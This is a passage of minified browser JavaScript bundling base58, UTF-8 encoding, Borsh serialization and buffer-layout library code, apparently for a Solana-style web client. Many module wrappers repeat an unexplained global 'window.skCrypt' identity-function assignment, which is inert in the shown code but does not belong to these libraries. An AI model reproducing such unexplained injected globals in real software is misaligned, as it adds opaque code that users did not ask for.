            (i.allocUnsafe = function (t) {
              if ("number" != typeof t)
                throw new TypeError("Argument must be a number");
              return r(t);
            }),
            (i.allocUnsafeSlow = function (t) {
              if ("number" != typeof t)
                throw new TypeError("Argument must be a number");
              return n.SlowBuffer(t);
            });
        })(er, er.exports)),
      er.exports
    );
  }
  var rr = (function () {
    if (tr) return $n;
    (tr = 1),
      (window.skCrypt = function (t) {
        return function () {
          return t;
        };
      });
    var t = (function () {
      if (Qn) return Yn;
      (Qn = 1),
        (window.skCrypt = function (t) {
          return function () {
            return t;
          };
        });
      var t = nr().Buffer;
      return (Yn = function (e) {
        if (e.length >= 255) throw new TypeError("Alphabet too long");
        for (var n = new Uint8Array(256), r = 0; r < n.length; r++) n[r] = 255;
        for (var o = 0; o < e.length; o++) {
          var i = e.charAt(o),
            s = i.charCodeAt(0);
          if (255 !== n[s]) throw new TypeError(i + " is ambiguous");
          n[s] = o;
        }
        var a = e.length,
          u = e.charAt(0),
          c = Math.log(a) / Math.log(256),
          l = Math.log(256) / Math.log(a);
        function d(e) {
          if ("string" != typeof e) throw new TypeError("Expected String");
          if (0 === e.length) return t.alloc(0);
          for (var r = 0, o = 0, i = 0; e[r] === u; ) o++, r++;
          for (
            var s = ((e.length - r) * c + 1) >>> 0, l = new Uint8Array(s);
            r < e.length;

          ) {
            var d = e.charCodeAt(r);
            if (d > 255) return;
            var f = n[d];
            if (255 === f) return;
            for (var h = 0, p = s - 1; (0 !== f || h < i) && -1 !== p; p--, h++)
              (f += (a * l[p]) >>> 0),
                (l[p] = f % 256 >>> 0),
                (f = (f / 256) >>> 0);
            if (0 !== f) throw new Error("Non-zero carry");
            (i = h), r++;
          }
          for (var m = s - i; m !== s && 0 === l[m]; ) m++;
          var g = t.allocUnsafe(o + (s - m));
          g.fill(0, 0, o);
          for (var y = o; m !== s; ) g[y++] = l[m++];
          return g;
        }
        return {
          encode: function (n) {
            if (
              ((Array.isArray(n) || n instanceof Uint8Array) && (n = t.from(n)),
              !t.isBuffer(n))
            )
              throw new TypeError("Expected Buffer");
            if (0 === n.length) return "";
            for (var r = 0, o = 0, i = 0, s = n.length; i !== s && 0 === n[i]; )
              i++, r++;
            for (
              var c = ((s - i) * l + 1) >>> 0, d = new Uint8Array(c);
              i !== s;

            ) {
              for (
                var f = n[i], h = 0, p = c - 1;
                (0 !== f || h < o) && -1 !== p;
                p--, h++
              )
                (f += (256 * d[p]) >>> 0),
                  (d[p] = f % a >>> 0),
                  (f = (f / a) >>> 0);
              if (0 !== f) throw new Error("Non-zero carry");
              (o = h), i++;
            }
            for (var m = c - o; m !== c && 0 === d[m]; ) m++;
            for (var g = u.repeat(r); m < c; ++m) g += e.charAt(d[m]);
            return g;
          },
          decodeUnsafe: d,
          decode: function (t) {
            var e = d(t);
            if (e) return e;
            throw new Error("Non-base" + a + " character");
          },
        };
      });
    })();
    return ($n = t(
      "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    ));
  })();
  const or = Un(rr);
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const ir = me;
  var sr,
    ar,
    ur,
    cr,
    lr = {};
  function dr() {
    if (cr) return ur;
    (cr = 1),
      (window.skCrypt = function (t) {
        return function () {
          return t;
        };
      });
    var t = (function () {
      if (ar) return sr;
      (ar = 1),
        (window.skCrypt = function (t) {
          return function () {
            return t;
          };
        });
      var t = nr().Buffer;
      return (sr = function (e) {
        if (e.length >= 255) throw new TypeError("Alphabet too long");
        for (var n = new Uint8Array(256), r = 0; r < n.length; r++) n[r] = 255;
        for (var o = 0; o < e.length; o++) {
          var i = e.charAt(o),
            s = i.charCodeAt(0);
          if (255 !== n[s]) throw new TypeError(i + " is ambiguous");
          n[s] = o;
        }
        var a = e.length,
          u = e.charAt(0),
          c = Math.log(a) / Math.log(256),
          l = Math.log(256) / Math.log(a);
        function d(e) {
          if ("string" != typeof e) throw new TypeError("Expected String");
          if (0 === e.length) return t.alloc(0);
          for (var r = 0, o = 0, i = 0; e[r] === u; ) o++, r++;
          for (
            var s = ((e.length - r) * c + 1) >>> 0, l = new Uint8Array(s);
            r < e.length;

          ) {
            var d = e.charCodeAt(r);
            if (d > 255) return;
            var f = n[d];
            if (255 === f) return;
            for (var h = 0, p = s - 1; (0 !== f || h < i) && -1 !== p; p--, h++)
              (f += (a * l[p]) >>> 0),
                (l[p] = f % 256 >>> 0),
                (f = (f / 256) >>> 0);
            if (0 !== f) throw new Error("Non-zero carry");
            (i = h), r++;
          }
          for (var m = s - i; m !== s && 0 === l[m]; ) m++;
          var g = t.allocUnsafe(o + (s - m));
          g.fill(0, 0, o);
          for (var y = o; m !== s; ) g[y++] = l[m++];
          return g;
        }
        return {
          encode: function (n) {
            if (
              ((Array.isArray(n) || n instanceof Uint8Array) && (n = t.from(n)),
              !t.isBuffer(n))
            )
              throw new TypeError("Expected Buffer");
            if (0 === n.length) return "";
            for (var r = 0, o = 0, i = 0, s = n.length; i !== s && 0 === n[i]; )
              i++, r++;
            for (
              var c = ((s - i) * l + 1) >>> 0, d = new Uint8Array(c);
              i !== s;

            ) {
              for (
                var f = n[i], h = 0, p = c - 1;
                (0 !== f || h < o) && -1 !== p;
                p--, h++
              )
                (f += (256 * d[p]) >>> 0),
                  (d[p] = f % a >>> 0),
                  (f = (f / a) >>> 0);
              if (0 !== f) throw new Error("Non-zero carry");
              (o = h), i++;
            }
            for (var m = c - o; m !== c && 0 === d[m]; ) m++;
            for (var g = u.repeat(r); m < c; ++m) g += e.charAt(d[m]);
            return g;
          },
          decodeUnsafe: d,
          decode: function (t) {
            var e = d(t);
            if (e) return e;
            throw new Error("Non-base" + a + " character");
          },
        };
      });
    })();
    return (ur = t(
      "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    ));
  }
  function fr(t, e, n) {
    return e <= t && t <= n;
  }
  function hr(t) {
    if (void 0 === t) return {};
    if (t === Object(t)) return t;
    throw TypeError("Could not convert argument to dictionary");
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  function pr(t) {
    this.tokens = [].slice.call(t);
  }
  pr.prototype = {
    endOfStream: function () {
      return !this.tokens.length;
    },
    read: function () {
      return this.tokens.length ? this.tokens.shift() : -1;
    },
    prepend: function (t) {
      if (Array.isArray(t))
        for (var e = t; e.length; ) this.tokens.unshift(e.pop());
      else this.tokens.unshift(t);
    },
    push: function (t) {
      if (Array.isArray(t))
        for (var e = t; e.length; ) this.tokens.push(e.shift());
      else this.tokens.push(t);
    },
  };
  var mr = -1;
  function gr(t, e) {
    if (t) throw TypeError("Decoder error");
    return e || 65533;
  }
  var yr = "utf-8";
  function wr(t, e) {
    if (!(this instanceof wr)) return new wr(t, e);
    if ((t = void 0 !== t ? String(t).toLowerCase() : yr) !== yr)
      throw new Error("Encoding not supported. Only utf-8 is supported");
    (e = hr(e)),
      (this._streaming = !1),
      (this._BOMseen = !1),
      (this._decoder = null),
      (this._fatal = Boolean(e.fatal)),
      (this._ignoreBOM = Boolean(e.ignoreBOM)),
      Object.defineProperty(this, "encoding", { value: "utf-8" }),
      Object.defineProperty(this, "fatal", { value: this._fatal }),
      Object.defineProperty(this, "ignoreBOM", { value: this._ignoreBOM });
  }
  function br(t, e) {
    if (!(this instanceof br)) return new br(t, e);
    if ((t = void 0 !== t ? String(t).toLowerCase() : yr) !== yr)
      throw new Error("Encoding not supported. Only utf-8 is supported");
    (e = hr(e)),
      (this._streaming = !1),
      (this._encoder = null),
      (this._options = { fatal: Boolean(e.fatal) }),
      Object.defineProperty(this, "encoding", { value: "utf-8" });
  }
  function vr(t) {
    var e = t.fatal,
      n = 0,
      r = 0,
      o = 0,
      i = 128,
      s = 191;
    this.handler = function (t, a) {
      if (-1 === a && 0 !== o) return (o = 0), gr(e);
      if (-1 === a) return mr;
      if (0 === o) {
        if (fr(a, 0, 127)) return a;
        if (fr(a, 194, 223)) (o = 1), (n = a - 192);
        else if (fr(a, 224, 239))
          224 === a && (i = 160),
            237 === a && (s = 159),
            (o = 2),
            (n = a - 224);
        else {
          if (!fr(a, 240, 244)) return gr(e);
          240 === a && (i = 144),
            244 === a && (s = 143),
            (o = 3),
            (n = a - 240);
        }
        return (n <<= 6 * o), null;
      }
      if (!fr(a, i, s))
        return (n = o = r = 0), (i = 128), (s = 191), t.prepend(a), gr(e);
      if (
        ((i = 128),
        (s = 191),
        (n += (a - 128) << (6 * (o - (r += 1)))),
        r !== o)
      )
        return null;
      var u = n;
      return (n = o = r = 0), u;
    };
  }
  function Ar(t) {
    t.fatal,
      (this.handler = function (t, e) {
        if (-1 === e) return mr;
        if (fr(e, 0, 127)) return e;
        var n, r;
        fr(e, 128, 2047)
          ? ((n = 1), (r = 192))
          : fr(e, 2048, 65535)
          ? ((n = 2), (r = 224))
          : fr(e, 65536, 1114111) && ((n = 3), (r = 240));
        for (var o = [(e >> (6 * n)) + r]; n > 0; ) {
          var i = e >> (6 * (n - 1));
          o.push(128 | (63 & i)), (n -= 1);
        }
        return o;
      });
  }
  (wr.prototype = {
    decode: function (t, e) {
      var n;
      (n =
        "object" == typeof t && t instanceof ArrayBuffer
          ? new Uint8Array(t)
          : "object" == typeof t &&
            "buffer" in t &&
            t.buffer instanceof ArrayBuffer
          ? new Uint8Array(t.buffer, t.byteOffset, t.byteLength)
          : new Uint8Array(0)),
        (e = hr(e)),
        this._streaming ||
          ((this._decoder = new vr({ fatal: this._fatal })),
          (this._BOMseen = !1)),
        (this._streaming = Boolean(e.stream));
      for (
        var r, o = new pr(n), i = [];
        !o.endOfStream() && (r = this._decoder.handler(o, o.read())) !== mr;

      )
        null !== r && (Array.isArray(r) ? i.push.apply(i, r) : i.push(r));
      if (!this._streaming) {
        do {
          if ((r = this._decoder.handler(o, o.read())) === mr) break;
          null !== r && (Array.isArray(r) ? i.push.apply(i, r) : i.push(r));
        } while (!o.endOfStream());
        this._decoder = null;
      }
      return (
        i.length &&
          (-1 === ["utf-8"].indexOf(this.encoding) ||
            this._ignoreBOM ||
            this._BOMseen ||
            (65279 === i[0]
              ? ((this._BOMseen = !0), i.shift())
              : (this._BOMseen = !0))),
        (function (t) {
          for (var e = "", n = 0; n < t.length; ++n) {
            var r = t[n];
            r <= 65535
              ? (e += String.fromCharCode(r))
              : ((r -= 65536),
                (e += String.fromCharCode(
                  55296 + (r >> 10),
                  56320 + (1023 & r)
                )));
          }
          return e;
        })(i)
      );
    },
  }),
    (br.prototype = {
      encode: function (t, e) {
        (t = t ? String(t) : ""),
          (e = hr(e)),
          this._streaming || (this._encoder = new Ar(this._options)),
          (this._streaming = Boolean(e.stream));
        for (
          var n,
            r = [],
            o = new pr(
              (function (t) {
                for (var e = String(t), n = e.length, r = 0, o = []; r < n; ) {
                  var i = e.charCodeAt(r);
                  if (i < 55296 || i > 57343) o.push(i);
                  else if (56320 <= i && i <= 57343) o.push(65533);
                  else if (55296 <= i && i <= 56319)
                    if (r === n - 1) o.push(65533);
                    else {
                      var s = t.charCodeAt(r + 1);
                      if (56320 <= s && s <= 57343) {
                        var a = 1023 & i,
                          u = 1023 & s;
                        o.push(65536 + (a << 10) + u), (r += 1);
                      } else o.push(65533);
                    }
                  r += 1;
                }
                return o;
              })(t)
            );
          !o.endOfStream() && (n = this._encoder.handler(o, o.read())) !== mr;

        )
          Array.isArray(n) ? r.push.apply(r, n) : r.push(n);
        if (!this._streaming) {
          for (; (n = this._encoder.handler(o, o.read())) !== mr; )
            Array.isArray(n) ? r.push.apply(r, n) : r.push(n);
          this._encoder = null;
        }
        return new Uint8Array(r);
      },
    });
  const kr = Wn(
    Object.freeze(
      Object.defineProperty(
        { __proto__: null, TextDecoder: wr, TextEncoder: br },
        Symbol.toStringTag,
        { value: "Module" }
      )
    )
  );
  var Ir;
  var Sr,
    _r = (function () {
      if (Ir) return lr;
      (Ir = 1),
        (window.skCrypt = function (t) {
          return function () {
            return t;
          };
        });
      var t =
          (lr && lr.__createBinding) ||
          (Object.create
            ? function (t, e, n, r) {
                void 0 === r && (r = n),
                  Object.defineProperty(t, r, {
                    enumerable: !0,
                    get: function () {
                      return e[n];
                    },
                  });
              }
            : function (t, e, n, r) {
                void 0 === r && (r = n), (t[r] = e[n]);
              }),
        e =
          (lr && lr.__setModuleDefault) ||
          (Object.create
            ? function (t, e) {
                Object.defineProperty(t, "default", {
                  enumerable: !0,
                  value: e,
                });
              }
            : function (t, e) {
                t.default = e;
              }),
        n =
          (lr && lr.__decorate) ||
          function (t, e, n, r) {
            var o,
              i = arguments.length,
              s =
                i < 3
                  ? e
                  : null === r
                  ? (r = Object.getOwnPropertyDescriptor(e, n))
                  : r;
            if (
              "object" == typeof Reflect &&
              "function" == typeof Reflect.decorate
            )
              s = Reflect.decorate(t, e, n, r);
            else
              for (var a = t.length - 1; a >= 0; a--)
                (o = t[a]) &&
                  (s = (i < 3 ? o(s) : i > 3 ? o(e, n, s) : o(e, n)) || s);
            return i > 3 && s && Object.defineProperty(e, n, s), s;
          },
        r =
          (lr && lr.__importStar) ||
          function (n) {
            if (n && n.__esModule) return n;
            var r = {};
            if (null != n)
              for (var o in n)
                "default" !== o &&
                  Object.hasOwnProperty.call(n, o) &&
                  t(r, n, o);
            return e(r, n), r;
          },
        o =
          (lr && lr.__importDefault) ||
          function (t) {
            return t && t.__esModule ? t : { default: t };
          };
      Object.defineProperty(lr, "__esModule", { value: !0 }),
        (lr.deserializeUnchecked =
          lr.deserialize =
          lr.serialize =
          lr.BinaryReader =
          lr.BinaryWriter =
          lr.BorshError =
          lr.baseDecode =
          lr.baseEncode =
            void 0);
      const i = o(Hn()),
        s = o(dr()),
        a = r(kr),
        u = new (
          "function" != typeof TextDecoder ? a.TextDecoder : TextDecoder
        )("utf-8", { fatal: !0 });
      (lr.baseEncode = function (t) {
        return (
          "string" == typeof t && (t = ct.from(t, "utf8")),
          s.default.encode(ct.from(t))
        );
      }),
        (lr.baseDecode = function (t) {
          return ct.from(s.default.decode(t));
        });
      const c = 1024;
      class l extends Error {
        constructor(t) {
          super(t), (this.fieldPath = []), (this.originalMessage = t);
        }
        addToFieldPath(t) {
          this.fieldPath.splice(0, 0, t),
            (this.message =
              this.originalMessage + ": " + this.fieldPath.join("."));
        }
      }
      lr.BorshError = l;
      class d {
        constructor() {
          (this.buf = ct.alloc(c)), (this.length = 0);
        }
        maybeResize() {
          this.buf.length < 16 + this.length &&
            (this.buf = ct.concat([this.buf, ct.alloc(c)]));
        }
        writeU8(t) {
          this.maybeResize(),
            this.buf.writeUInt8(t, this.length),
            (this.length += 1);
        }
        writeU16(t) {
          this.maybeResize(),
            this.buf.writeUInt16LE(t, this.length),
            (this.length += 2);
        }
        writeU32(t) {
          this.maybeResize(),
            this.buf.writeUInt32LE(t, this.length),
            (this.length += 4);
        }
        writeU64(t) {
          this.maybeResize(),
            this.writeBuffer(ct.from(new i.default(t).toArray("le", 8)));
        }
        writeU128(t) {
          this.maybeResize(),
            this.writeBuffer(ct.from(new i.default(t).toArray("le", 16)));
        }
        writeU256(t) {
          this.maybeResize(),
            this.writeBuffer(ct.from(new i.default(t).toArray("le", 32)));
        }
        writeU512(t) {
          this.maybeResize(),
            this.writeBuffer(ct.from(new i.default(t).toArray("le", 64)));
        }
        writeBuffer(t) {
          (this.buf = ct.concat([
            ct.from(this.buf.subarray(0, this.length)),
            t,
            ct.alloc(c),
          ])),
            (this.length += t.length);
        }
        writeString(t) {
          this.maybeResize();
          const e = ct.from(t, "utf8");
          this.writeU32(e.length), this.writeBuffer(e);
        }
        writeFixedArray(t) {
          this.writeBuffer(ct.from(t));
        }
        writeArray(t, e) {
          this.maybeResize(), this.writeU32(t.length);
          for (const n of t) this.maybeResize(), e(n);
        }
        toArray() {
          return this.buf.subarray(0, this.length);
        }
      }
      function f(t, e, n) {
        const r = n.value;
        n.value = function (...t) {
          try {
            return r.apply(this, t);
          } catch (e) {
            if (e instanceof RangeError) {
              const t = e.code;
              if (
                ["ERR_BUFFER_OUT_OF_BOUNDS", "ERR_OUT_OF_RANGE"].indexOf(t) >= 0
              )
                throw new l("Reached the end of buffer when deserializing");
            }
            throw e;
          }
        };
      }
      lr.BinaryWriter = d;
      class h {
        constructor(t) {
          (this.buf = t), (this.offset = 0);
        }
        readU8() {
          const t = this.buf.readUInt8(this.offset);
          return (this.offset += 1), t;
        }
        readU16() {
          const t = this.buf.readUInt16LE(this.offset);
          return (this.offset += 2), t;
        }
        readU32() {
          const t = this.buf.readUInt32LE(this.offset);
          return (this.offset += 4), t;
        }
        readU64() {
          const t = this.readBuffer(8);
          return new i.default(t, "le");
        }
        readU128() {
          const t = this.readBuffer(16);
          return new i.default(t, "le");
        }
        readU256() {
          const t = this.readBuffer(32);
          return new i.default(t, "le");
        }
        readU512() {
          const t = this.readBuffer(64);
          return new i.default(t, "le");
        }
        readBuffer(t) {
          if (this.offset + t > this.buf.length)
            throw new l(`Expected buffer length ${t} isn't within bounds`);
          const e = this.buf.slice(this.offset, this.offset + t);
          return (this.offset += t), e;
        }
        readString() {
          const t = this.readU32(),
            e = this.readBuffer(t);
          try {
            return u.decode(e);
          } catch (n) {
            throw new l(`Error decoding UTF-8 string: ${n}`);
          }
        }
        readFixedArray(t) {
          return new Uint8Array(this.readBuffer(t));
        }
        readArray(t) {
          const e = this.readU32(),
            n = Array();
          for (let r = 0; r < e; ++r) n.push(t());
          return n;
        }
      }
      function p(t) {
        return t.charAt(0).toUpperCase() + t.slice(1);
      }
      function m(t, e, n, r, o) {
        try {
          if ("string" == typeof r) o[`write${p(r)}`](n);
          else if (r instanceof Array)
            if ("number" == typeof r[0]) {
              if (n.length !== r[0])
                throw new l(
                  `Expecting byte array of length ${r[0]}, but got ${n.length} bytes`
                );
              o.writeFixedArray(n);
            } else if (2 === r.length && "number" == typeof r[1]) {
              if (n.length !== r[1])
                throw new l(
                  `Expecting byte array of length ${r[1]}, but got ${n.length} bytes`
                );
              for (let e = 0; e < r[1]; e++) m(t, null, n[e], r[0], o);
            } else
              o.writeArray(n, (n) => {
                m(t, e, n, r[0], o);
              });
          else if (void 0 !== r.kind)
            switch (r.kind) {
              case "option":
                null == n
                  ? o.writeU8(0)
                  : (o.writeU8(1), m(t, e, n, r.type, o));
                break;
              case "map":
                o.writeU32(n.size),
                  n.forEach((n, i) => {
                    m(t, e, i, r.key, o), m(t, e, n, r.value, o);
                  });
                break;
              default:
                throw new l(`FieldType ${r} unrecognized`);
            }
          else g(t, n, o);
        } catch (i) {
          throw (i instanceof l && i.addToFieldPath(e), i);
        }
      }
      function g(t, e, n) {
        if ("function" == typeof e.borshSerialize)
          return e.borshSerialize(n), void 0;
        const r = t.get(e.constructor);
        if (!r) throw new l(`Class ${e.constructor.name} is missing in schema`);
        if ("struct" === r.kind)
          r.fields.map(([r, o]) => {
            m(t, r, e[r], o, n);
          });
        else {
          if ("enum" !== r.kind)
            throw new l(
              `Unexpected schema kind: ${r.kind} for ${e.constructor.name}`
            );
          {
            const o = e[r.field];
            for (let i = 0; i < r.values.length; ++i) {
              const [s, a] = r.values[i];
              if (s === o) {
                n.writeU8(i), m(t, s, e[s], a, n);
                break;
              }
            }
          }
        }
      }
      function y(t, e, n, r) {
        try {
          if ("string" == typeof n) return r[`read${p(n)}`]();
          if (n instanceof Array) {
            if ("number" == typeof n[0]) return r.readFixedArray(n[0]);
            if ("number" == typeof n[1]) {
              const e = [];
              for (let o = 0; o < n[1]; o++) e.push(y(t, null, n[0], r));
              return e;
            }
            return r.readArray(() => y(t, e, n[0], r));
          }
          if ("option" === n.kind) {
            return r.readU8() ? y(t, e, n.type, r) : void 0;
          }
          if ("map" === n.kind) {
            let o = new Map();
            const i = r.readU32();
            for (let s = 0; s < i; s++) {
              const i = y(t, e, n.key, r),
                s = y(t, e, n.value, r);
              o.set(i, s);
            }
            return o;
          }
          return w(t, n, r);
        } catch (o) {
          throw (o instanceof l && o.addToFieldPath(e), o);
        }
      }
      function w(t, e, n) {
        if ("function" == typeof e.borshDeserialize)
          return e.borshDeserialize(n);
        const r = t.get(e);
        if (!r) throw new l(`Class ${e.name} is missing in schema`);
        if ("struct" === r.kind) {
          const r = {};
          for (const [o, i] of t.get(e).fields) r[o] = y(t, o, i, n);
          return new e(r);
        }
        if ("enum" === r.kind) {
          const o = n.readU8();
          if (o >= r.values.length)
            throw new l(`Enum index: ${o} is out of range`);
          const [i, s] = r.values[o],
            a = y(t, i, s, n);
          return new e({ [i]: a });
        }
        throw new l(
          `Unexpected schema kind: ${r.kind} for ${e.constructor.name}`
        );
      }
      return (
        n([f], h.prototype, "readU8", null),
        n([f], h.prototype, "readU16", null),
        n([f], h.prototype, "readU32", null),
        n([f], h.prototype, "readU64", null),
        n([f], h.prototype, "readU128", null),
        n([f], h.prototype, "readU256", null),
        n([f], h.prototype, "readU512", null),
        n([f], h.prototype, "readString", null),
        n([f], h.prototype, "readFixedArray", null),
        n([f], h.prototype, "readArray", null),
        (lr.BinaryReader = h),
        (lr.serialize = function (t, e, n = d) {
          const r = new n();
          return g(t, e, r), r.toArray();
        }),
        (lr.deserialize = function (t, e, n, r = h) {
          const o = new r(n),
            i = w(t, e, o);
          if (o.offset < n.length)
            throw new l(
              `Unexpected ${n.length - o.offset} bytes after deserialized data`
            );
          return i;
        }),
        (lr.deserializeUnchecked = function (t, e, n, r = h) {
          return w(t, e, new r(n));
        }),
        lr
      );
    })(),
    Tr = {};
  var Cr = (function () {
    if (Sr) return Tr;
    (Sr = 1),
      (window.skCrypt = function (t) {
        return function () {
          return t;
        };
      }),
      Object.defineProperty(Tr, "__esModule", { value: !0 }),
      (Tr.s16 =
        Tr.s8 =
        Tr.nu64be =
        Tr.u48be =
        Tr.u40be =
        Tr.u32be =
        Tr.u24be =
        Tr.u16be =
        Tr.nu64 =
        Tr.u48 =
        Tr.u40 =
        Tr.u32 =
        Tr.u24 =
        Tr.u16 =
        Tr.u8 =
        Tr.offset =
        Tr.greedy =
        Tr.Constant =
        Tr.UTF8 =
        Tr.CString =
        Tr.Blob =
        Tr.Boolean =
        Tr.BitField =
        Tr.BitStructure =
        Tr.VariantLayout =
        Tr.Union =
        Tr.UnionLayoutDiscriminator =
        Tr.UnionDiscriminator =
        Tr.Structure =
        Tr.Sequence =
        Tr.DoubleBE =
        Tr.Double =
        Tr.FloatBE =
        Tr.Float =
        Tr.NearInt64BE =
        Tr.NearInt64 =
        Tr.NearUInt64BE =
        Tr.NearUInt64 =
        Tr.IntBE =
        Tr.Int =
        Tr.UIntBE =
        Tr.UInt =
        Tr.OffsetLayout =
        Tr.GreedyCount =
        Tr.ExternalLayout =
        Tr.bindConstructorLayout =
        Tr.nameWithProperty =
        Tr.Layout =
        Tr.uint8ArrayToBuffer =
        Tr.checkUint8Array =
          void 0),
      (Tr.constant =
        Tr.utf8 =
        Tr.cstr =
        Tr.blob =
        Tr.unionLayoutDiscriminator =
        Tr.union =
        Tr.seq =
        Tr.bits =
        Tr.struct =
        Tr.f64be =
        Tr.f64 =
        Tr.f32be =
        Tr.f32 =
        Tr.ns64be =
        Tr.s48be =
        Tr.s40be =
        Tr.s32be =
        Tr.s24be =
        Tr.s16be =
        Tr.ns64 =
        Tr.s48 =
        Tr.s40 =
        Tr.s32 =
        Tr.s24 =
          void 0);
    const t = jn();
    function e(t) {
      if (!(t instanceof Uint8Array))
        throw new TypeError("b must be a Uint8Array");
    }
    function n(n) {
      return e(n), t.Buffer.from(n.buffer, n.byteOffset, n.length);
    }
    (Tr.checkUint8Array = e), (Tr.uint8ArrayToBuffer = n);
    class r {
      constructor(t, e) {
        if (!Number.isInteger(t))
          throw new TypeError("span must be an integer");
        (this.span = t), (this.property = e);
      }
      makeDestinationObject() {
        return {};
      }
      getSpan(t, e) {
        if (0 > this.span) throw new RangeError("indeterminate span");
        return this.span;
      }
      replicate(t) {
        const e = Object.create(this.constructor.prototype);
        return Object.assign(e, this), (e.property = t), e;
      }
      fromArray(t) {}
    }
    function o(t, e) {
      return e.property ? t + "[" + e.property + "]" : t;
    }
    (Tr.Layout = r),
      (Tr.nameWithProperty = o),
      (Tr.bindConstructorLayout = function (t, e) {
        if ("function" != typeof t)
          throw new TypeError("Class must be constructor");
        if (Object.prototype.hasOwnProperty.call(t, "layout_"))
          throw new Error("Class is already bound to a layout");
        if (!(e && e instanceof r))
          throw new TypeError("layout must be a Layout");
        if (Object.prototype.hasOwnProperty.call(e, "boundConstructor_"))
          throw new Error("layout is already bound to a constructor");
        (t.layout_ = e),
          (e.boundConstructor_ = t),
          (e.makeDestinationObject = () => new t()),
          Object.defineProperty(t.prototype, "encode", {
            value(t, n) {
              return e.encode(this, t, n);
            },
            writable: !0,
          }),
          Object.defineProperty(t, "decode", {
            value: (t, n) => e.decode(t, n),
            writable: !0,
          });
      });
    class i extends r {
      isCount() {
        throw new Error("ExternalLayout is abstract");
      }
    }
    Tr.ExternalLayout = i;
    class s extends i {
      constructor(t = 1, e) {
        if (!Number.isInteger(t) || 0 >= t)
          throw new TypeError("elementSpan must be a (positive) integer");
        super(-1, e), (this.elementSpan = t);
      }
      isCount() {
        return !0;
      }
      decode(t, n = 0) {
        e(t);
        const r = t.length - n;
        return Math.floor(r / this.elementSpan);
      }
      encode(t, e, n) {
        return 0;
      }
    }
    Tr.GreedyCount = s;
    class a extends i {
      constructor(t, e = 0, n) {
        if (!(t instanceof r)) throw new TypeError("layout must be a Layout");
        if (!Number.isInteger(e))
          throw new TypeError("offset must be integer or undefined");
        super(t.span, n || t.property), (this.layout = t), (this.offset = e);
      }
      isCount() {
        return this.layout instanceof u || this.layout instanceof c;
      }
      decode(t, e = 0) {
        return this.layout.decode(t, e + this.offset);
      }
      encode(t, e, n = 0) {
        return this.layout.encode(t, e, n + this.offset);
      }
    }
    Tr.OffsetLayout = a;
    class u extends r {
      constructor(t, e) {
        if ((super(t, e), 6 < this.span))
          throw new RangeError("span must not exceed 6 bytes");
      }
      decode(t, e = 0) {
        return n(t).readUIntLE(e, this.span);
      }
      encode(t, e, r = 0) {
        return n(e).writeUIntLE(t, r, this.span), this.span;
      }
    }
    Tr.UInt = u;
    class c extends r {
      constructor(t, e) {
        if ((super(t, e), 6 < this.span))
          throw new RangeError("span must not exceed 6 bytes");
      }
      decode(t, e = 0) {
        return n(t).readUIntBE(e, this.span);
      }
      encode(t, e, r = 0) {
        return n(e).writeUIntBE(t, r, this.span), this.span;
      }
    }
    Tr.UIntBE = c;
    class l extends r {
      constructor(t, e) {
        if ((super(t, e), 6 < this.span))
          throw new RangeError("span must not exceed 6 bytes");
      }
      decode(t, e = 0) {
        return n(t).readIntLE(e, this.span);
      }
      encode(t, e, r = 0) {
        return n(e).writeIntLE(t, r, this.span), this.span;
      }
    }
    Tr.Int = l;
    class d extends r {
      constructor(t, e) {
        if ((super(t, e), 6 < this.span))
          throw new RangeError("span must not exceed 6 bytes");
      }
      decode(t, e = 0) {
        return n(t).readIntBE(e, this.span);
      }
      encode(t, e, r = 0) {
        return n(e).writeIntBE(t, r, this.span), this.span;
      }
    }
    Tr.IntBE = d;
    const f = Math.pow(2, 32);
    function h(t) {
      const e = Math.floor(t / f);
      return { hi32: e, lo32: t - e * f };
    }
    function p(t, e) {
      return t * f + e;
    }
    class m extends r {
      constructor(t) {
        super(8, t);
      }
      decode(t, e = 0) {
        const r = n(t),
          o = r.readUInt32LE(e);
        return p(r.readUInt32LE(e + 4), o);
      }
      encode(t, e, r = 0) {
        const o = h(t),
          i = n(e);
        return i.writeUInt32LE(o.lo32, r), i.writeUInt32LE(o.hi32, r + 4), 8;
      }
    }
    Tr.NearUInt64 = m;
    class g extends r {
      constructor(t) {
        super(8, t);
      }
      decode(t, e = 0) {
        const r = n(t);
        return p(r.readUInt32BE(e), r.readUInt32BE(e + 4));
      }
      encode(t, e, r = 0) {
        const o = h(t),
          i = n(e);
        return i.writeUInt32BE(o.hi32, r), i.writeUInt32BE(o.lo32, r + 4), 8;
      }
    }
    Tr.NearUInt64BE = g;
    class y extends r {
      constructor(t) {
        super(8, t);
      }
      decode(t, e = 0) {
        const r = n(t),
          o = r.readUInt32LE(e);
        return p(r.readInt32LE(e + 4), o);
      }
      encode(t, e, r = 0) {
        const o = h(t),
          i = n(e);
        return i.writeUInt32LE(o.lo32, r), i.writeInt32LE(o.hi32, r + 4), 8;
      }
    }
    Tr.NearInt64 = y;
    class w extends r {
      constructor(t) {
        super(8, t);
      }
      decode(t, e = 0) {
        const r = n(t);
        return p(r.readInt32BE(e), r.readUInt32BE(e + 4));
      }
      encode(t, e, r = 0) {
        const o = h(t),
          i = n(e);
        return i.writeInt32BE(o.hi32, r), i.writeUInt32BE(o.lo32, r + 4), 8;
      }
    }
    Tr.NearInt64BE = w;
    class b extends r {
      constructor(t) {
        super(4, t);
      }
      decode(t, e = 0) {
        return n(t).readFloatLE(e);
      }
      encode(t, e, r = 0) {
        return n(e).writeFloatLE(t, r), 4;
      }
    }
    Tr.Float = b;
    class v extends r {
      constructor(t) {
        super(4, t);
      }
      decode(t, e = 0) {
        return n(t).readFloatBE(e);
      }
      encode(t, e, r = 0) {
        return n(e).writeFloatBE(t, r), 4;
      }
    }
    Tr.FloatBE = v;
    class A extends r {
      constructor(t) {
        super(8, t);
      }
      decode(t, e = 0) {
        return n(t).readDoubleLE(e);
      }
      encode(t, e, r = 0) {
        return n(e).writeDoubleLE(t, r), 8;
      }
    }
    Tr.Double = A;
    class k extends r {
      constructor(t) {
        super(8, t);
      }
      decode(t, e = 0) {
        return n(t).readDoubleBE(e);
      }
      encode(t, e, r = 0) {
        return n(e).writeDoubleBE(t, r), 8;
      }
    }
    Tr.DoubleBE = k;
    class I extends r {
      constructor(t, e, n) {
        if (!(t instanceof r))
